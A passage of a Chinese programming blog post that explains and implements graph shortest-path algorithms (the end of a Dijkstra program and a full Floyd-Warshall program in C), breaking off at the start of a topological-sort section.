class="line">&#123;</span><br><span class="line">dist[w] = dist[v] + this-&gt;arcs[v][w];</span><br><span class="line">path[w] = path[v];</span><br><span class="line">path[w].push(vexs[w]);</span><br><span class="line">&#125;</span><br><span class="line">w = this-&gt;nextadj(v, w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;从结点&quot;</span> &lt;&lt; start_point &lt;&lt; <span class="string">&quot;开始到各点的最短路径和路径长度如下:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dist[i] == MAX)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无法到达结点&quot;</span> &lt;&lt; this-&gt;vexs[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;抵达结点&quot;</span> &lt;&lt; this-&gt;vexs[i] &lt;&lt; <span class="string">&quot;的最短路径:&quot;</span>;</span><br><span class="line"><span class="type">int</span> path_length = path[i].size();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; path_length; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; path[i].front() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">path[i].pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;长度为&quot;</span> &lt;&lt; dist[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Graph s;</span><br><span class="line">s.Create();</span><br><span class="line">s.Show();</span><br><span class="line">VertexType start_point;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入起点:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; start_point;</span><br><span class="line">s.Dijkstra(start_point);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果:<br><img src="https://img-blog.csdnimg.cn/6a74f76cf3a942d0a2681598f8e880b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/qq_51462776/article/details/122148218?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448321716780269836468%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448321716780269836468&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-122148218.first_rank_v2_pc_rank_v29&amp;utm_term=%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">参考文章</a></p><h3 id="邻接表实现"><a class="markdownIt-Anchor" href="#邻接表实现">#</a> 邻接表实现</h3><p>待定</p><h2 id="floyd算法求多源最短路径问题"><a class="markdownIt-Anchor" href="#floyd算法求多源最短路径问题">#</a> Floyd 算法 (求多源最短路径问题)</h2><h3 id="算法思想"><a class="markdownIt-Anchor" href="#算法思想">#</a> 算法思想</h3><p><img src="https://img-blog.csdnimg.cn/e6693483ab424a109ca5d2cc67e3fa56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7696568b305543b9935afc3b82d6c1d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>概括为迭代更新 i 经由 k 到 j 的最短路径.</p><h3 id="算法原理-2"><a class="markdownIt-Anchor" href="#算法原理-2">#</a> 算法原理</h3><ol><li>从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。</li><li>对于每一对顶点 u 和 v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比已知的路径更短。如果是更新它。</li><li>把图用邻接矩阵 G 表示出来，如果从 Vi 到 Vj 有路可达，则 G [i][j]=d，d 表示该路的长度；否则 G [i][j]= 无穷大。定义一个矩阵 D 用来记录所插入点的信息，D [i][j] 表示从 Vi 到 Vj 需要经过的点，初始化 D [i][j]=j。把各个顶点插入图中，比较插点后的距离与原来的距离，G [i][j]= min ( G [i][j], G [i][k]+G [k][j] )，如果 G [i][j] 的值变小，则 D [i][j]=k。在 G 中包含有两点之间最短道路的信息，而在 D 中则包含了最短通路径的信息。</li><li>比如，要寻找从 V5 到 V1 的路径。根据 D，假如 D (5,1)=3 则说明从 V5 到 V1 经过 V3，路径为 {V5,V3,V1}，如果 D (5,3)=3，说明 V5 与 V3 直接相连，如果 D (3,1)=1，说明 V3 与 V1 直接相连。</li></ol><h3 id="邻接矩阵实现-2"><a class="markdownIt-Anchor" href="#邻接矩阵实现-2">#</a> 邻接矩阵实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXV 7<span class="comment">//最大顶点个数 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 32767<span class="comment">//定义 ∞</span></span></span><br><span class="line"><span class="comment">//∞ == 32767 ,int 型的最大范围（2位）= 2^(2*8-1)，TC告诉我们int占用2个字节，而VC和LGCC告诉我们int占用4个字节</span></span><br><span class="line"><span class="comment">//图：Graph</span></span><br><span class="line"><span class="comment">//顶点：Vertex</span></span><br><span class="line"><span class="comment">//邻接：Adjacency</span></span><br><span class="line"><span class="comment">//矩阵：Matrix</span></span><br><span class="line"><span class="comment">//表：List</span></span><br><span class="line"><span class="comment">//边：Edge </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vertex</span> &#123;</span></span><br><span class="line"><span class="type">int</span> number;<span class="comment">//顶点的编号 </span></span><br><span class="line">&#125;VertexType; <span class="comment">//别名，顶点的类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">matrix</span> &#123;</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="type">int</span> e;<span class="comment">//边数 </span></span><br><span class="line"><span class="type">int</span> adjMat[MAXV][MAXV];<span class="comment">//邻接矩阵数组</span></span><br><span class="line">VertexType ver[MAXV];<span class="comment">//存放顶点信息 </span></span><br><span class="line">&#125;MatGraph;<span class="comment">//别名，完整的图邻接矩阵类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">eNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> adjVer;<span class="comment">//该边的邻接点编号 </span></span><br><span class="line"><span class="type">int</span> weiLGht;<span class="comment">//该边的的信息，如权值 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eNode</span>* <span class="title">nextEdLGe</span>;</span><span class="comment">//指向下一条边的指针 </span></span><br><span class="line">&#125;EdgeNode; <span class="comment">//别名，边结点的类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vNode</span> &#123;</span></span><br><span class="line">EdgeNode* firstEdLGe;<span class="comment">//指向第一个边结点 </span></span><br><span class="line">&#125;VNode; <span class="comment">//别名，邻接表的头结点类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="type">int</span> e;<span class="comment">//边数</span></span><br><span class="line">VNode adjList[MAXV];<span class="comment">//邻接表的头结点数组 </span></span><br><span class="line">&#125;ListGraph;<span class="comment">//别名，完整的图邻接表类型 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建图的邻接表 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">createAdjListGraph</span><span class="params">(ListGraph*&amp; LG, <span class="type">int</span> A[MAXV][MAXV], <span class="type">int</span> n, <span class="type">int</span> e)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">EdgeNode* p;</span><br><span class="line">LG = (ListGraph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ListGraph));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">LG-&gt;adjList[i].firstEdLGe = <span class="literal">NULL</span>;<span class="comment">//给邻接表中所有头结点指针域置初值 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;<span class="comment">//检查邻接矩阵中的每个元素 </span></span><br><span class="line"><span class="keyword">for</span> (j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] != <span class="number">0</span>) &#123;<span class="comment">//存在一条边 </span></span><br><span class="line">p = (EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));<span class="comment">//申请一个结点内存</span></span><br><span class="line">p-&gt;adjVer = j;<span class="comment">//存放邻接点 </span></span><br><span class="line">p-&gt;weiLGht = A[i][j];<span class="comment">//存放权值</span></span><br><span class="line">p-&gt;nextEdLGe = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;nextEdLGe = LG-&gt;adjList[i].firstEdLGe;<span class="comment">//头插法 </span></span><br><span class="line">LG-&gt;adjList[i].firstEdLGe = p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">LG-&gt;n = n;</span><br><span class="line">LG-&gt;e = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出邻接表 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayAdjList</span><span class="params">(ListGraph* LG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">EdgeNode* p;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line">p = LG-&gt;adjList[i].firstEdLGe;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:&quot;</span>, i);</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;weiLGht != <span class="number">32767</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2d[%d]-&gt;&quot;</span>, p-&gt;adjVer, p-&gt;weiLGht);</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;nextEdLGe;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出邻接矩阵</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayAdjMat</span><span class="params">(MatGraph MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MAXV; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (MG.adjMat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4s&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (MG.adjMat[i][j] == <span class="number">32767</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4s&quot;</span>, <span class="string">&quot;∞&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, MG.adjMat[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表转换为邻接矩阵</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ListToMat</span><span class="params">(ListGraph* LG, MatGraph&amp; MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">EdgeNode* p;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MAXV; j++) &#123;</span><br><span class="line">MG.adjMat[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LG-&gt;n; i++) &#123;</span><br><span class="line">p = LG-&gt;adjList[i].firstEdLGe;</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">MG.adjMat[i][p-&gt;adjVer] = p-&gt;weiLGht;</span><br><span class="line">p = p-&gt;nextEdLGe;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MG.n = LG-&gt;n;</span><br><span class="line">MG.e = LG-&gt;e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出多源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayPath</span><span class="params">(MatGraph MG, <span class="type">int</span> A[MAXV][MAXV], <span class="type">int</span> path[MAXV][MAXV])</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="type">int</span> s;</span><br><span class="line"><span class="type">int</span> aPath[MAXV];<span class="comment">//存放一条最短路径（逆向）</span></span><br><span class="line"><span class="type">int</span> d;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] != INF &amp;&amp; i != j) &#123;<span class="comment">//若顶点 i 和 顶点 j 之间存在路径</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;从 %d 到 %d 的路径为：&quot;</span>, i, j);</span><br><span class="line">k = path[i][j];</span><br><span class="line">d = <span class="number">0</span>;</span><br><span class="line">aPath[d] = j;<span class="comment">//路径上添加终点</span></span><br><span class="line"><span class="keyword">while</span> (k != <span class="number">-1</span> &amp;&amp; k != i) &#123;<span class="comment">//路劲上添加中间点</span></span><br><span class="line">d++;</span><br><span class="line">aPath[d] = k;</span><br><span class="line">k = path[i][k];</span><br><span class="line">&#125;</span><br><span class="line">d++;</span><br><span class="line">aPath[d] = i;<span class="comment">//路径上添加起点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, aPath[d]);<span class="comment">//输出起点</span></span><br><span class="line"><span class="keyword">for</span> (s = d - <span class="number">1</span>; s &gt;= <span class="number">0</span>; s--) &#123;<span class="comment">//输出路径上其他顶点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&gt;%d&quot;</span>, aPath[s]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;路径长度为：%d\n&quot;</span>, A[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Floyd算法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Floyd</span><span class="params">(MatGraph MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="type">int</span> A[MAXV][MAXV];</span><br><span class="line"><span class="type">int</span> path[MAXV][MAXV];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line">A[i][j] = MG.adjMat[i][j];</span><br><span class="line"><span class="keyword">if</span> (i != j &amp;&amp; MG.adjMat[i][j] &lt; INF) &#123;</span><br><span class="line">path[i][j] = i;<span class="comment">//顶点 i 到顶点 j 有边时</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">path[i][j] = <span class="number">-1</span>;<span class="comment">//顶点 i 到顶点 j 无边时</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; MG.n; k++) &#123;<span class="comment">//一次考察所有顶点</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] &gt; A[i][k] + A[k][j]) &#123;</span><br><span class="line">A[i][j] = A[i][k] + A[k][j];<span class="comment">//修改最短路径长度</span></span><br><span class="line">path[i][j] = path[k][j];<span class="comment">//修改最短路径</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">displayPath(MG, A, path);<span class="comment">//输出最短路径</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">ListGraph* LG;</span><br><span class="line">MatGraph MG;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[MAXV][MAXV] = &#123;</span><br><span class="line">&#123;  <span class="number">0</span>,  <span class="number">4</span>,  <span class="number">6</span>,  <span class="number">6</span>,INF,INF,INF&#125;,</span><br><span class="line">&#123;INF,  <span class="number">0</span>,  <span class="number">1</span>,INF,  <span class="number">7</span>,INF,INF&#125;,</span><br><span class="line">&#123;INF,INF,  <span class="number">0</span>,INF,  <span class="number">6</span>,  <span class="number">4</span>,INF&#125;,</span><br><span class="line">&#123;INF,INF,  <span class="number">2</span>,  <span class="number">0</span>,INF,  <span class="number">5</span>,INF&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,  <span class="number">0</span>,INF,  <span class="number">6</span>&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,  <span class="number">1</span>,  <span class="number">0</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,INF,INF,  <span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> e = <span class="number">12</span>;</span><br><span class="line">createAdjListGraph(LG, <span class="built_in">array</span>, MAXV, e);</span><br><span class="line">displayAdjList(LG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">ListToMat(LG, MG);</span><br><span class="line">displayAdjMat(MG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">Floyd(MG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果:<br><img src="https://img-blog.csdnimg.cn/cbefb6ddae0641b98c6869893181943a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/qq_51462776/article/details/122148626?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448438616780255294556%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448438616780255294556&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-122148626.first_rank_v2_pc_rank_v29&amp;utm_term=floyd%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">参考文章 1</a><br><a href="https://blog.csdn.net/weixin_42109012/article/details/94217203?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448438616780265420631%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164448438616780265420631&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-94217203.first_rank_v2_pc_rank_v29&amp;utm_term=floyd%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187"> 参考文章 2</a></p><h2 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序">#</a> 拓扑排序</h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理</h3><ol><li>从 AOV 网中选择一个没有前驱的顶点并输出.</li><li>从网中删除该顶点和所有以它为起点的有向边.</li><li>重复直至 AOV 网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环.</li></ol><h3 id="栈实现拓扑排序邻接表实现"><a class="markdownIt-Anchor" href="#栈实现拓扑排序邻接表实现">#</a> 栈实现拓扑排序（邻接表实现）</h3><p><img src="https://img-blog.csdnimg.cn/b65b8230b9dc460aaa883c8881baa1b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 